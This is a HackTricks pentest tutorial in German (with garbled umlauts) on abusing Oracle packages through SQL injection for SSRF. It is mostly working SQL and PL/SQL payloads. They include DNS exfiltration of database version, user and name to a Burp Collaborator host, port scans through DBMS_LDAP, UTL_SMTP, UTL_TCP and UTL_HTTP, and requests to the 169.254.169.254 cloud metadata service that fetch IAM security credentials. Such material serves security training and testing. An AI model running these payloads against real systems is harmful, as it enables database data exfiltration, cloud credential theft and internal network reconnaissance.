# Oracle injection

{% hint style="success" %}
Lerne & √ºbe AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Lerne & √ºbe GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* √úberpr√ºfe die [**Abonnementpl√§ne**](https://github.com/sponsors/carlospolop)!
* **Tritt der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folge** uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teile Hacking-Tricks, indem du PRs zu den** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos einreichst.

</details>
{% endhint %}

**Diene diesem Beitrag als Wayback-Maschinenkopie des gel√∂schten Beitrags von [https://ibreak.software/2020/06/using-sql-injection-to-perform-ssrf-xspa-attacks/](https://ibreak.software/2020/06/using-sql-injection-to-perform-ssrf-xspa-attacks/)**.

## SSRF

Die Verwendung von Oracle f√ºr Out of Band HTTP- und DNS-Anfragen ist gut dokumentiert, aber als Mittel zur Exfiltration von SQL-Daten in Injektionen. Wir k√∂nnen diese Techniken/Funktionen immer modifizieren, um andere SSRF/XSPA durchzuf√ºhren.

Die Installation von Oracle kann wirklich schmerzhaft sein, insbesondere wenn du eine schnelle Instanz einrichten m√∂chtest, um Befehle auszuprobieren. Mein Freund und Kollege bei [Appsecco](https://appsecco.com), [Abhisek Datta](https://github.com/abhisek), wies mich auf [https://github.com/MaksymBilenko/docker-oracle-12c](https://github.com/MaksymBilenko/docker-oracle-12c) hin, das es mir erm√∂glichte, eine Instanz auf einer t2.large AWS Ubuntu-Maschine und Docker einzurichten.

Ich f√ºhrte den Docker-Befehl mit dem `--network="host"`-Flag aus, damit ich Oracle als native Installation mit vollem Netzwerkzugang nachahmen konnte, f√ºr den Verlauf dieses Blogbeitrags.
```
docker run -d --network="host" quay.io/maksymbilenko/oracle-12c
```
#### Oracle-Pakete, die eine URL oder eine Hostname/Portnummer-Spezifikation unterst√ºtzen <a href="#oracle-packages-that-support-a-url-or-a-hostname-port-number-specification" id="oracle-packages-that-support-a-url-or-a-hostname-port-number-specification"></a>

Um Pakete und Funktionen zu finden, die eine Host- und Port-Spezifikation unterst√ºtzen, habe ich eine Google-Suche in der [Oracle-Datenbank Online-Dokumentation](https://docs.oracle.com/database/121/index.html) durchgef√ºhrt. Genauer gesagt,
```
site:docs.oracle.com inurl:"/database/121/ARPLS" "host"|"hostname" "port"|"portnum"
```
Die Suche ergab die folgenden Ergebnisse (nicht alle k√∂nnen verwendet werden, um ausgehende Netzwerke durchzuf√ºhren)

* DBMS\_NETWORK\_ACL\_ADMIN
* UTL\_SMTP
* DBMS\_XDB
* DBMS\_SCHEDULER
* DBMS\_XDB\_CONFIG
* DBMS\_AQ
* UTL\_MAIL
* DBMS\_AQELM
* DBMS\_NETWORK\_ACL\_UTILITY
* DBMS\_MGD\_ID\_UTL
* UTL\_TCP
* DBMS\_MGWADM
* DBMS\_STREAMS\_ADM
* UTL\_HTTP

Diese grobe Suche √ºberspringt offensichtlich Pakete wie `DBMS_LDAP` (das die √úbergabe eines Hostnamens und einer Portnummer erm√∂glicht), da [die Dokumentationsseite](https://docs.oracle.com/database/121/ARPLS/d\_ldap.htm#ARPLS360) Sie einfach auf [einen anderen Ort](https://docs.oracle.com/database/121/ARPLS/d\_ldap.htm#ARPLS360) verweist. Daher kann es andere Oracle-Pakete geben, die missbraucht werden k√∂nnen, um ausgehende Anfragen zu stellen, die ich m√∂glicherweise √ºbersehen habe.

In jedem Fall lassen Sie uns einige der Pakete ansehen, die wir entdeckt und oben aufgelistet haben.

**DBMS\_LDAP.INIT**

Das `DBMS_LDAP`-Paket erm√∂glicht den Zugriff auf Daten von LDAP-Servern. Die Funktion `init()` initialisiert eine Sitzung mit einem LDAP-Server und nimmt einen Hostnamen und eine Portnummer als Argument.

Diese Funktion wurde zuvor dokumentiert, um die Exfiltration von Daten √ºber DNS zu zeigen, wie unten
```
SELECT DBMS_LDAP.INIT((SELECT version FROM v$instance)||'.'||(SELECT user FROM dual)||'.'||(select name from V$database)||'.'||'d4iqio0n80d5j4yg7mpu6oeif9l09p.burpcollaborator.net',80) FROM dual;
```
Allerdings, da die Funktion einen Hostnamen und eine Portnummer als Argumente akzeptiert, k√∂nnen Sie dies auch verwenden, um wie ein Portscanner zu arbeiten.

Hier sind einige Beispiele
```
SELECT DBMS_LDAP.INIT('scanme.nmap.org',22) FROM dual;
SELECT DBMS_LDAP.INIT('scanme.nmap.org',25) FROM dual;
SELECT DBMS_LDAP.INIT('scanme.nmap.org',80) FROM dual;
SELECT DBMS_LDAP.INIT('scanme.nmap.org',8080) FROM dual;
```
Ein `ORA-31203: DBMS_LDAP: PL/SQL - Init Failed.` zeigt, dass der Port geschlossen ist, w√§hrend ein Sitzungswert darauf hinweist, dass der Port offen ist.

**UTL\_SMTP**

Das `UTL_SMTP`-Paket ist zum Versenden von E-Mails √ºber SMTP konzipiert. Das Beispiel auf der [Oracle-Dokumentationsseite zeigt, wie Sie dieses Paket verwenden k√∂nnen, um eine E-Mail zu senden](https://docs.oracle.com/database/121/ARPLS/u_smtp.htm#ARPLS71478). F√ºr uns ist jedoch das Interessante die M√∂glichkeit, eine Host- und Port-Spezifikation bereitzustellen.

Ein einfaches Beispiel wird unten mit der Funktion `UTL_SMTP.OPEN_CONNECTION` gezeigt, mit einem Timeout von 2 Sekunden.
```
DECLARE c utl_smtp.connection;
BEGIN
c := UTL_SMTP.OPEN_CONNECTION('scanme.nmap.org',80,2);
END;
```

```
DECLARE c utl_smtp.connection;
BEGIN
c := UTL_SMTP.OPEN_CONNECTION('scanme.nmap.org',8080,2);
END;
```
Eine `ORA-29276: transfer timeout` zeigt an, dass der Port offen ist, aber keine SMTP-Verbindung hergestellt wurde, w√§hrend eine `ORA-29278: SMTP transient error: 421 Service not available` zeigt, dass der Port geschlossen ist.

**UTL\_TCP**

Das `UTL_TCP`-Paket und seine Prozeduren und Funktionen erm√∂glichen [TCP/IP-basierte Kommunikation mit Diensten](https://docs.oracle.com/cd/B28359_01/appdev.111/b28419/u_tcp.htm#i1004190). Wenn es f√ºr einen bestimmten Dienst programmiert ist, kann dieses Paket leicht zu einem Zugang zum Netzwerk werden oder vollst√§ndige Server-seitige Anfragen durchf√ºhren, da alle Aspekte einer TCP/IP-Verbindung kontrolliert werden k√∂nnen.

Das Beispiel [auf der Oracle-Dokumentationsseite zeigt, wie Sie dieses Paket verwenden k√∂nnen, um eine rohe TCP-Verbindung herzustellen, um eine Webseite abzurufen](https://docs.oracle.com/cd/B28359_01/appdev.111/b28419/u_tcp.htm#i1004190). Wir k√∂nnen es ein wenig vereinfachen und verwenden, um beispielsweise Anfragen an die Metadateninstanz oder an einen beliebigen TCP/IP-Dienst zu stellen.
```
set serveroutput on size 30000;
SET SERVEROUTPUT ON
DECLARE c utl_tcp.connection;
retval pls_integer;
BEGIN
c := utl_tcp.open_connection('169.254.169.254',80,tx_timeout => 2);
retval := utl_tcp.write_line(c, 'GET /latest/meta-data/ HTTP/1.0');
retval := utl_tcp.write_line(c);
BEGIN
LOOP
dbms_output.put_line(utl_tcp.get_line(c, TRUE));
END LOOP;
EXCEPTION
WHEN utl_tcp.end_of_input THEN
NULL;
END;
utl_tcp.close_connection(c);
END;
/
```

```
DECLARE c utl_tcp.connection;
retval pls_integer;
BEGIN
c := utl_tcp.open_connection('scanme.nmap.org',22,tx_timeout => 4);
retval := utl_tcp.write_line(c);
BEGIN
LOOP
dbms_output.put_line(utl_tcp.get_line(c, TRUE));
END LOOP;
EXCEPTION
WHEN utl_tcp.end_of_input THEN
NULL;
END;
utl_tcp.close_connection(c);
END;
```
Interessanterweise kann dieses Paket aufgrund der M√∂glichkeit, rohe TCP-Anfragen zu erstellen, auch verwendet werden, um den Instanz-Meta-Daten-Dienst aller Cloud-Anbieter abzufragen, da der Methodentyp und zus√§tzliche Header alle innerhalb der TCP-Anfrage √ºbergeben werden k√∂nnen.

**UTL\_HTTP und Webanfragen**

Vielleicht die h√§ufigste und am weitesten dokumentierte Technik in jedem Out of Band Oracle SQL Injection-Tutorial ist das [`UTL_HTTP`-Paket](https://docs.oracle.com/database/121/ARPLS/u_http.htm#ARPLS070). Dieses Paket wird in der Dokumentation definiert als - `Das UTL_HTTP-Paket f√ºhrt Hypertext Transfer Protocol (HTTP)-Aufrufe aus SQL und PL/SQL durch. Sie k√∂nnen es verwenden, um √ºber HTTP auf Daten im Internet zuzugreifen.`
```
select UTL_HTTP.request('http://169.254.169.254/latest/meta-data/iam/security-credentials/adminrole') from dual;
```
Sie k√∂nnten dies zus√§tzlich verwenden, um auch einige rudiment√§re Port-Scans mit Abfragen wie durchzuf√ºhren.
```
select UTL_HTTP.request('http://scanme.nmap.org:22') from dual;
select UTL_HTTP.request('http://scanme.nmap.org:8080') from dual;
select UTL_HTTP.request('http://scanme.nmap.org:25') from dual;
```
Ein `ORA-12541: TNS:no listener` oder ein `TNS:operation timed out` ist ein Zeichen daf√ºr, dass der TCP-Port geschlossen ist, w√§hrend ein `ORA-29263: HTTP protocol error` oder Daten ein Zeichen daf√ºr sind, dass der Port offen ist.

Ein weiteres Paket, das ich in der Vergangenheit mit unterschiedlichem Erfolg verwendet habe, ist die [`GETCLOB()`-Methode des `HTTPURITYPE` Oracle abstrakten Typs](https://docs.oracle.com/database/121/ARPLS/t_dburi.htm#ARPLS71705), die es Ihnen erm√∂glicht, mit einer URL zu interagieren und Unterst√ºtzung f√ºr das HTTP-Protokoll bietet. Die `GETCLOB()`-Methode wird verwendet, um die GET-Antwort von einer URL als [CLOB-Datentyp](https://docs.oracle.com/javadb/10.10.1.2/ref/rrefclob.html) abzurufen. [select HTTPURITYPE('http://169.254.169.254/latest/meta-data/instance-id').getclob() from dual;

{% hint style="success" %}
Lernen & √ºben Sie AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Lernen & √ºben Sie GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* √úberpr√ºfen Sie die [**Abonnementpl√§ne**](https://github.com/sponsors/carlospolop)!
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos senden.

</details>
{% endhint %}
